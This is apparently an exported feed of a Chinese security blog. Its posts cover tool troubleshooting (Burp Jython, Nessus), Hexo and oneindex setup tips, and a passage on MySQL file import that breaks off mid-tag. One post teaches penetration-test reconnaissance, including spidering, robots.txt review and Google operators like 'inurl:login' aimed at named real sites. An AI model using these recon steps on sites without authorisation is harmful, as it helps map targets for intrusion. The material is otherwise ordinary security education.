        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天在安装burpsuite中的jpython环境时，出现了问题，这里记录一下，防止下次再次出现问题时不知所措。</p><a id="more"></a><h1 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h1><p>具体环境配置如下，路径都是正确的</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819214055.png" class="lozad"></p><p>勾选插件时出现下面的情况</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819214215.png" class="lozad"></p><h1 id="0x02-问题原因"><a href="#0x02-问题原因" class="headerlink" title="0x02 问题原因"></a>0x02 问题原因</h1><p>jar包出现了问题，重新下载jar包完美解决问题</p><p>加载出错的jar包</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819214244.png" class="lozad"></p><p>官网下载的jar包</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819214301.png" class="lozad">    可以从文件的大小中就可以看出来，jar包有问题。</p><h1 id="0x03-解决步骤"><a href="#0x03-解决步骤" class="headerlink" title="0x03 解决步骤"></a>0x03 解决步骤</h1><p>第一步：去官网重新下载jython 的jar包文件</p><p> <a href="https://www.jython.org/downloads.html" target="_blank" rel="noopener">https://www.jython.org/downloads.html</a></p><p>第二步：将下载的jar包文件放到burp安装包路径下或者其他目录下也可以</p><p>注：必须示纯英文的路径，不能是中文路径，否则会出现错误。</p><p>第三步：重新导入jar包，路径需要正确，如下：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819214332.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819214344.png" class="lozad"></p><blockquote><p>小技巧：输入法状态切换到英文输入模式下，然后按j，即可快速定位需要找到的文件。</p></blockquote><p>重新加载，成功了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819214422.png" class="lozad"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>在遇到问题时，不要慌张，先去百度，google等搜索引擎搜索一下，看看是否有前人的解决方法，这样可以快速的解决问题，如果没有找到相关的解决方法，可以通过错误信息的提示，逐一排查，找到可能的错误点</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解决问题 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nessus数据库崩溃问题</title>
      <link href="/2019/08/19/nessus%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B4%A9%E6%BA%83%E9%97%AE%E9%A2%98/"/>
      <url>/2019/08/19/nessus%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B4%A9%E6%BA%83%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天想用nessus扫描器扫描一下系统，看看有没有什么漏洞，但是打开浏览器的时候发现，提示数据库崩溃了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819212849.png" class="lozad"></p><p>然后上网百度，貌似在百度贴吧中找到了答案，然后，为了给以后的自己和碰到同样问题的朋友看，我在给大家讲讲吧。</p><a id="more"></a><h1 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h1><p>在浏览器中打开nessus时，提示下面错误，</p><p>Corrupt Database</p><p>A corrupt database has been detected which prevents Nessus from running. Please take the following corrective actions:</p><p>图片详情</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213106.png" class="lozad"></p><h1 id="0x02-解决方法"><a href="#0x02-解决方法" class="headerlink" title="0x02 解决方法"></a>0x02 解决方法</h1><ol><li><p>按win+R ，输入services.msc</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213150.png" class="lozad"></p></li><li><p>找到tenable nessus服务，右击停止服务</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213227.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213240.png" class="lozad"></p></li><li><p>在nessus的安装目录中，找到global.db文件，直接剪切到桌面或者删掉，或者大家实在找不到该文件的话，可以下载一个everything快速搜索软件，可以快速的搜索到这个软件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213309.png" class="lozad"></p></li><li><p>再次启动nessus服务</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213402.png" class="lozad"></p></li><li><p>刷新浏览器，等舒适化完成，舒服Nessus，Nessus账号密码，成功登陆系统。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213423.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213434.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213456.png" class="lozad"></p></li></ol><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>出现问题，先不要慌张，因为，你应该不是第一个碰到这个问题的人，so，百度，Google，寻找答案，之所谓：授人予鱼，不如授人于渔。方法告诉你了，下次要记得的多百度寻找答案奥！: D</p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解决问题 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一章：应用程序及表单风险（渗透测试方法论）</title>
      <link href="/2019/08/19/%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%8F%8A%E8%A1%A8%E5%8D%95%E9%A3%8E%E9%99%A9/"/>
      <url>/2019/08/19/%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%8F%8A%E8%A1%A8%E5%8D%95%E9%A3%8E%E9%99%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>渗透测试对于每个人来说，测试的思路都不一样，但是大体思路还是信息收集-&gt;漏洞扫描-&gt;漏洞利用-&gt;权限提升-&gt;清理痕迹-&gt;输出报告。不过企业中的灰盒测试一般都是主要漏洞挖掘为主，这样的话，就需要有一个测试的方法论在进行测试了。so，这里给大家整理出渗透测试的方法论分享给大家。</p><a id="more"></a><h1 id="0x01-搜索可见的内容"><a href="#0x01-搜索可见的内容" class="headerlink" title="0x01 搜索可见的内容"></a>0x01 搜索可见的内容</h1><p>一般情况下，手动浏览就可以确定应用程序的大部分内容和功能。浏览应用程序的基本方法是从初始页面开始，依次浏览每一个链接和所有的多阶段功能。但是为了仔细检查枚举的内容，全面记录每一项确定的功能，简单的浏览就不再能满足我们的需求，有必要使用更加先进的工具。</p><p>（1）首先配置浏览器，使用代理工具，可以使用BurpSuite等工具监控和解析由代理服务器处理的Web内容，对站点实行被动抓取。</p><p>首先开启代理，然后打开Burpsuite并找到Target下的Site map</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220707.png" class="lozad"></p><p>访问目标网站，对其进行自动爬取，由于完全自动化的方法在内容枚举方面还有一定的限制，例如</p><ol><li>身份验证时爬虫的一些操作会让通过验证的会话中断；</li><li>向某个敏感内容提交无效输入，应用程序可能会自我防御，终止会话；</li><li>多阶段功能往往会严格的执行输入确认检查，可能不会接受自动工具提交的值；</li><li>爬虫可能会发现并使用敏感功能，造成重大损失等等。</li></ol><p>所以更多的时候我们选择进行指定爬取，即用户通过常规方式浏览应用程序，来枚举应用程序的所有功能，生成的流量穿过一个组合拦截代理服务器与爬虫的工具，监控所有请求和响应，并且像一个正常的应用程序感知爬虫那样来分析应用程序的响应，BurpSuite中的爬虫就有这种用途。</p><p>（3）接下来进行指定爬取</p><p>​         以常规方式浏览整个应用程序，访问发现的每一个url，提交每一个表单并执行全部多阶段功能，尝试在JavaScript激活与禁用、cookie激活与禁用的情况下浏览。</p><p>如何禁用cookie</p><p>​         打开设置，找到Privacy，点击Firefox will右边的下拉菜单，选择use custom settings for history，然后将Accept cookies from sites前面的√去掉</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820000246.png" class="lozad"></p><p>如何禁用JavaScript</p><p>​         在地址栏输入about:config，点击 I accept the risk！</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820000228.png" class="lozad"></p><p>搜索javascript，找到javascript.enable，双击关闭</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820000328.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820000341.png" class="lozad"></p><p>4）完成手动浏览和被动抓取以后，可以用一组发现的url作为种子，使用爬虫抓取应用程序。有时候这样可以发现其他在手动浏览时忽略的内容。在进行自动抓取前，首先应确定任何危险的或可能会中断应用程序会话的url，并配置爬虫，将它们排除在抓取范围之外。</p><blockquote><p>PS：许多Web服务器的根目录下有一个名为robots.txt的文件，其中列出了站点不希望Web爬虫访问或搜索引擎列入索引的url。有时候这个文件中可能会包含一些敏感信息，这些信息很可能会危机Web程序的安全。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820000432.png" class="lozad"></p></blockquote><h1 id="0x02-浏览公共资源"><a href="#0x02-浏览公共资源" class="headerlink" title="0x02 浏览公共资源"></a>0x02 浏览公共资源</h1><p>（1）使用因特网搜索引擎和历史档案，确定它们编入索引或保存的与目标应用程序有关的内容。</p><p>例如使用Wayback Machine查看历史档案</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820174711.png" class="lozad"></p><p>随便搜索一个网站，就用我们团队的网站来测试，可以看到不同的时间节点有保存的快照信息。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820175553.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820175921.png" class="lozad"></p><p>使用<strong>高级搜索</strong>提高效率。例如，在<code>Google</code>中，可以使用<code>site:</code>获取所有与目标站点有关的内容，使用<code>link:</code>获取链接到目标站点的其他站点。如果在搜索过程中找到现有应用程序已经删除的内容，仍然可以从搜索引擎的缓存中查看这些内容。这些已经被删除的内容中可能包含尚未删除的其他资源的链接。</p><p>使用<code>site: 目标站点</code>进行搜索</p><p><code>site:www.baidu.com</code>将返回Google引用的每一个目标站点的资源</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820180212.png" class="lozad"></p><p>site:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>  inurl:login将返回所有包含login表达式的页面。在大型且复杂的应用程序中，可以快速定位感兴趣的资源，如管理菜单、密码重置等功能</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820180437.png" class="lozad"></p><p>使用link:进行搜索</p><p>link:<a href="http://www.wandouxueyuan.com返回其他Web站点和应用程序中所有包含目标站点的链接的页面，其中包括过去内容的链接或仅第三方可用的功能。" target="_blank" rel="noopener">www.wandouxueyuan.com返回其他Web站点和应用程序中所有包含目标站点的链接的页面，其中包括过去内容的链接或仅第三方可用的功能。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181209.png" class="lozad"></p><p>使用related进行搜索</p><p>related:<a href="http://www.tencent.com它将返回与目标站点“相似”的页面，可能会包含大量的无关资料，但是也可能包含在其他站点与目标有关的讨论，可能会有所帮助。" target="_blank" rel="noopener">www.tencent.com它将返回与目标站点“相似”的页面，可能会包含大量的无关资料，但是也可能包含在其他站点与目标有关的讨论，可能会有所帮助。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181233.png" class="lozad"></p><p>（3）搜索在应用程序内容[如联系信息，包括并未在屏幕上显示的内容(如HTML注释)]中发现的任何姓名与电子邮件地址。除Web搜索外，还应进行新闻和分组搜索。在论坛上寻找与目标应用程序及其支持基础架构有关的所有技术信息。</p><p>此处使用evilscience靶机作为检索对象</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181305.png" class="lozad"></p><p>在这个网站中有很多的注释，当然这些注释没有什么用，此处只是为了演示</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181324.png" class="lozad"></p><p>在一些安全性不是很强的网站里面还会直接找到用户名</p><p>例如：<img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181345.png" class="lozad"></p><p>新闻搜索：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181406.png" class="lozad"></p><p>（4）检查已发布的任何WSDL文件，以生成应用程序可能采用的功能名称和参数值列表。</p><h1 id="0x03-发现隐藏内容"><a href="#0x03-发现隐藏内容" class="headerlink" title="0x03 发现隐藏内容"></a>0x03 发现隐藏内容</h1><h1 id="0x04-查找默认的内容"><a href="#0x04-查找默认的内容" class="headerlink" title="0x04 查找默认的内容"></a>0x04 查找默认的内容</h1><h1 id="0x05-枚举标识符制定的功能"><a href="#0x05-枚举标识符制定的功能" class="headerlink" title="0x05 枚举标识符制定的功能"></a>0x05 枚举标识符制定的功能</h1><h1 id="0x06-调试参数"><a href="#0x06-调试参数" class="headerlink" title="0x06 调试参数"></a>0x06 调试参数</h1><h1 id="0x07-调试参数"><a href="#0x07-调试参数" class="headerlink" title="0x07 调试参数"></a>0x07 调试参数</h1><h1 id="0x08-确定数据输入点"><a href="#0x08-确定数据输入点" class="headerlink" title="0x08 确定数据输入点"></a>0x08 确定数据输入点</h1><h1 id="0x09-确定所使用的技术"><a href="#0x09-确定所使用的技术" class="headerlink" title="0x09 确定所使用的技术"></a>0x09 确定所使用的技术</h1><h1 id="0x10-解析受攻击面"><a href="#0x10-解析受攻击面" class="headerlink" title="0x10 解析受攻击面"></a>0x10 解析受攻击面</h1><h1 id="0x11-通过客户端传送数据"><a href="#0x11-通过客户端传送数据" class="headerlink" title="0x11 通过客户端传送数据"></a>0x11 通过客户端传送数据</h1><h1 id="0x12-客户端输入控件"><a href="#0x12-客户端输入控件" class="headerlink" title="0x12 客户端输入控件"></a>0x12 客户端输入控件</h1><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 方法论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo蝴蝶主题的一些小功能(跟新中)</title>
      <link href="/2019/08/18/hexo%E8%9D%B4%E8%9D%B6%E4%B8%BB%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%8A%9F%E8%83%BD-%E8%B7%9F%E6%96%B0%E4%B8%AD/"/>
      <url>/2019/08/18/hexo%E8%9D%B4%E8%9D%B6%E4%B8%BB%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%8A%9F%E8%83%BD-%E8%B7%9F%E6%96%B0%E4%B8%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在从使用next主题后，因为博客的加载缓慢问题，让我再次放弃的这个主题，而偶然的看到同事使用的<strong>蝴蝶</strong>主题，让我欢喜不已。因为这个主题真的太好看了，一下子吸引了我，而且整个博客加载的速度也是非常的快。不过由图床使用的是GitHub的图床，所有在图片加载这个方面还是有点慢。不过整理影响不是很大。这篇文章来给大家介绍一下，换了<strong>蝴蝶</strong> 主题后的一些小功能细节问题。</p><a id="more"></a><h1 id="0x01-导航栏图标问题"><a href="#0x01-导航栏图标问题" class="headerlink" title="0x01 导航栏图标问题"></a>0x01 导航栏图标问题</h1><p>导航栏栏图片，就是在导航栏的文字前面都有对应的小图标，不知道有没有人和我一样，因为增加了导航栏的功能菜单，但是苦苦的找不到对应的图标，让博客看起来不是很好看。</p><h2 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215702.png" class="lozad"></p><h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>访问<a href="https://www.thinkcmf.com/font/font_awesome/icon/hdd-o" target="_blank" rel="noopener">font_awesome网站</a>，主页如下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215732.png" class="lozad"></p><p>搜索想要的图标，比如电影</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215746.png" class="lozad"></p><p>复制电影的代码</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215801.png" class="lozad"></p><p>在主题的配置文件下替换掉后面的标识</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215816.png" class="lozad"></p><p>然后刷新一下浏览器就能看到了</p><h2 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215835.png" class="lozad"></p><h1 id="0x02-分类目录二级目录"><a href="#0x02-分类目录二级目录" class="headerlink" title="0x02 分类目录二级目录"></a>0x02 分类目录二级目录</h1><p>不知道大家有没有这样的苦恼，就是在写文章的时候，把很多文章都归类到一个大类中，到最后自己找文章的时候都不太好找，但是如果我们将文章都归类到一个二级分类，然后二级分类在归类到一级分类，这样的话是不是找起来更方便一点尼。</p><h2 id="效果预览-1"><a href="#效果预览-1" class="headerlink" title="效果预览"></a>效果预览</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215849.png" class="lozad"></p><h2 id="实现步骤-1"><a href="#实现步骤-1" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>在每次写文章的时候，categories按照如下格式书写。第一个为一级，第二个为二级。理论上来说，还可以添加3级，4级分类目录，这个根据自己的喜好和实际需求了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215907.png" class="lozad"></p><p>在每次写文章的时候，categories按照如下格式书写。第一个为一级，第二个为二级。</p><h2 id="效果查看-1"><a href="#效果查看-1" class="headerlink" title="效果查看"></a>效果查看</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215919.png" class="lozad"></p><h1 id="0x03-hexo-部署出现问题"><a href="#0x03-hexo-部署出现问题" class="headerlink" title="0x03 hexo 部署出现问题"></a>0x03 hexo 部署出现问题</h1><p>在使用hexo d或者hexo deploy Mingling 时，发现不能部署。</p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215934.png" class="lozad"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在博客根目录下，输入<code>npm install --save hexo-deployer-git</code>命令，</p><p>安装完成以后再次之行hexo deploy 一切正常</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215947.png" class="lozad"></p><h1 id="0x04-关闭page页面或者特定文章的评论"><a href="#0x04-关闭page页面或者特定文章的评论" class="headerlink" title="0x04 关闭page页面或者特定文章的评论"></a>0x04 关闭page页面或者特定文章的评论</h1><p>我们在写文章的时候，经常可能会碰到有些文章不需要增加评论的功能，那怎么去实现尼，其实hexo早就想到这点了，实现很简单，一条命令即可。</p><h2 id="实现步骤-2"><a href="#实现步骤-2" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>只要在文章的md或者page的md文件头中加入comments: false即可</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220005.png" class="lozad"></p><p>注意：是comments 不是comment，单词别写错，第二个，false前面有一个<strong>空格</strong></p><h1 id="0x05-给Hexo正确添加RSS订阅"><a href="#0x05-给Hexo正确添加RSS订阅" class="headerlink" title="0x05 给Hexo正确添加RSS订阅"></a>0x05 给Hexo正确添加RSS订阅</h1><h2 id="安装feed插件"><a href="#安装feed插件" class="headerlink" title="安装feed插件"></a>安装feed插件</h2><p>在博客的根目录下输入<code>npm install hexo-generator-feed</code>命令安装，然后等待安装完成</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220017.png" class="lozad"></p><h2 id="添加配置文件"><a href="#添加配置文件" class="headerlink" title="添加配置文件"></a>添加配置文件</h2><p>打开站点配置文件_config.yml，末尾添加以下配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: http://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">#RSS订阅</span></span><br><span class="line">plugin:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line"><span class="comment">#Feed Atom</span></span><br><span class="line">feed:</span><br><span class="line">type: atom</span><br><span class="line">path: atom.xml</span><br><span class="line">limit: <span class="number">20</span></span><br></pre></td></tr></table></figure><p>打开主题配置文件_config.yml，按Ctrl+F 搜索rss，添加配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rss: /atom.xml</span><br></pre></td></tr></table></figure><h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><p>输入一下命令，然后刷新一下浏览器即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220032.png" class="lozad"></p><p><img alt="img" data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63r98bfavj21gn0nbads.jpg" class="lozad"></p><h1 id="0x06-修改阅读时长，文章热度"><a href="#0x06-修改阅读时长，文章热度" class="headerlink" title="0x06 修改阅读时长，文章热度"></a>0x06 修改阅读时长，文章热度</h1><h2 id="实现步骤-3"><a href="#实现步骤-3" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>Butterfly/languages/zh-CN.yml 下，搜索post，然后按照下图修改即可</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220053.png" class="lozad"></p><h2 id="效果显示"><a href="#效果显示" class="headerlink" title="效果显示"></a>效果显示</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220113.png" class="lozad"></p><hr>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 主题功能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oneindex后续</title>
      <link href="/2019/08/16/oneindex%E5%90%8E%E7%BB%AD/"/>
      <url>/2019/08/16/oneindex%E5%90%8E%E7%BB%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    在前一篇文章《<a href="[https://www.mad-coding.cn/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/#more](https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/#more)">使用onedrive+oneindex打造一个专属个人网盘</a>》中，我们已经成功的搭建好了一个网盘了，但是这还不算完美，还需要增加一些小细节，比如文件夹加密，文件夹描述，云盘底部介绍等等，下面就来给大家讲讲如何实现。</p><a id="more"></a><h1 id="0x01-实现文件夹加密功能"><a href="#0x01-实现文件夹加密功能" class="headerlink" title="0x01 实现文件夹加密功能"></a>0x01 实现文件夹加密功能</h1><p>实现文件夹加密的功能非常简单，原理就是在需要加密的文件夹中创建一个.password的文件，然后在该文件中输入自己需要设置的密码即可。但是，问题来了，我们正常情况下，Windows是不允许创建一个没有名称的文件的，提示如下。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816095402.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816095232.png" class="lozad"></p><p>那么，该如何解决这个问题尼？ 其实还是有方法的。比如在cmd中使用命令来直接创建该文件，就不会出现这种情况了，具体操作如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd Desktop <span class="comment">#切换到桌面</span></span><br><span class="line">echo <span class="number">123456</span> &gt; .password   <span class="comment">#创建.password文件，并将123456写入该文件</span></span><br><span class="line"><span class="comment">#123456就是加密的文章夹密码</span></span><br></pre></td></tr></table></figure><p>.password文件创建好后，可以上传到你想加密的文件夹，当然这个文件也可以复制到其他文件夹，这样就不需要每次重复创建了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816095923.png" class="lozad"></p><p>如果想立马看到效果的话，去oneindex后台重新刷新一下缓存，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816100042.png" class="lozad"></p><p>再次访问发现成功加密文件夹，需要输入密码才能访问</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816100119.png" class="lozad"></p><p>ps1：这里输入密码访问成功访问后，发现后面就不用再次输入密码了，原因是浏览器记录了缓存信息，再次使用一个新的浏览器打开还是需要密码的，所以不用担心。</p><p>ps2：如果需要实现在加密的文件夹中再加密文件夹，原理还是一样的，也是在需要加密的文件夹中放入.password文件即可，这样的话，就可以给每个不同的私人文件夹放置不同的密码，即使一个文件夹的密码被猜解出来，其他文件夹也还是安全的。</p><h1 id="0x02-网盘底部创建介绍信息"><a href="#0x02-网盘底部创建介绍信息" class="headerlink" title="0x02 网盘底部创建介绍信息"></a>0x02 网盘底部创建介绍信息</h1><p>这个功能实现过程非常的简单，只需要在网盘根目录中新建一个README.md文件即可，然后在该文件中写入自己需要介绍的信息。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816102157.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816102124.png" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>如果还有新功能，会在跟新。皮卡皮卡^v^</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 好玩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oneindex;onedrive </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何将*.frm，*.MYD和*.MYI格式的文件导入MySQL中</title>
      <link href="/2019/08/14/%E5%A6%82%E4%BD%95%E5%B0%86-frm%EF%BC%8C-MYD%E5%92%8C-MYI%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5MySQL%E4%B8%AD/"/>
      <url>/2019/08/14/%E5%A6%82%E4%BD%95%E5%B0%86-frm%EF%BC%8C-MYD%E5%92%8C-MYI%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5MySQL%E4%B8%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​        在学mysql数据库的时候，可能有小伙伴经常碰到.frm, .MYD，.MYI 的文件，但是却不知道如何还原其中的数据，今天博客也是碰到了一样的问题，经过在晚上一番搜索后，成功还原了，在这里记录一下，然后分享给大家。</p><a id="more"></a><h1 id="0x01-操作步骤"><a href="#0x01-操作步骤" class="headerlink" title="0x01 操作步骤"></a>0x01 操作步骤</h1><p>创建数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE test2</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190814181929.png" class="lozad"></p><p>执行成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190814182045.png" class="lozad"></p><p>刷新数据库</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190814182133.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190814182154.png" class="lozad"></p><p>利用PHPstudy找到mysql数据库的安装路径，然后找到data文件夹</p><p><img alt 